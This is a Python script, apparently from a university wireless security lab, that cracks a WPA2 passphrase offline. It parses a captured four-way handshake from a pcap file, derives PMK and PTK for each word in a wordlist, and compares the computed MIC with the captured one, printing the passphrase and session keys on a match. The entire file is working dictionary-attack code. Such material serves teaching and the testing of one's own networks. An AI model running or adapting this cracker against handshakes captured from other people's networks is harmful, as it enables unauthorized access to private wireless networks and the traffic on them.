#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

import struct
from curses import KEY_A1
from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap")

# Used to get Nonce AP
handshake_m1 = wpa[5]
# Used to get Nonce Client
handshake_m2 = wpa[6]
# Used to get the MIC to test and the corresponding datas
handshake_m4 = wpa[8]
# Used to get the SSID
broadcast_message_ap = wpa[0]

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = broadcast_message_ap.info.decode('utf-8') #"SWI"
APmac       = a2b_hex(handshake_m1.addr2.replace(':', '')) #a2b_hex("cebcc8fdcab7")
Clientmac   = a2b_hex(handshake_m1.addr1.replace(':', '')) #a2b_hex("0013efd015bd")

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex(handshake_m1.original[67:99].hex()) #a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")
SNonce      = a2b_hex(handshake_m2.original[65:97].hex()) #a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
# MIC to test is always in the fourth message and at the position n-1 just before the "WPA Key Data Length"
mic_to_test = a2b_hex(handshake_m4.original[-18:-2].hex()) #"36eef66540fa801ceee2fea9b7929b40"
data        = handshake_m4.original[48:-18] + b'\0'*16 + handshake_m4.original[-2:] # Only want the message with MIC at 0.

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")
print ("Client Nonce: ",b2a_hex(SNonce),"\n")


wordlist = "wordlist.txt"

f = open(wordlist, "r")

for phrase in f:
    phrase = phrase.strip('\n')
    pmk = pbkdf2(hashlib.sha1, str.encode(phrase), str.encode(ssid), 4096, 32)
    ptk = customPRF512(pmk, str.encode(A), B)
    print(phrase)
    mic = hmac.new(ptk[0:16], data, hashlib.sha1).hexdigest()
    print(mic)
    print(mic[:-8])
    print(mic_to_test.hex())
    print()
    if mic[:-8] != mic_to_test.hex():
        continue

    print("passphrase is : ", phrase)
    print("\nResults of the key expansion")
    print("=============================")
    print("PMK:\t\t", pmk.hex(), "\n")
    print("PTK:\t\t", ptk.hex(), "\n")
    print("KCK:\t\t", ptk[0:16].hex(), "\n")
    print("KEK:\t\t", ptk[16:32].hex(), "\n")
    print("TK:\t\t", ptk[32:48].hex(), "\n")
    print("MICK:\t\t", ptk[48:64].hex(), "\n")
    print("MIC:\t\t", mic, "\n")

    break

f.close()


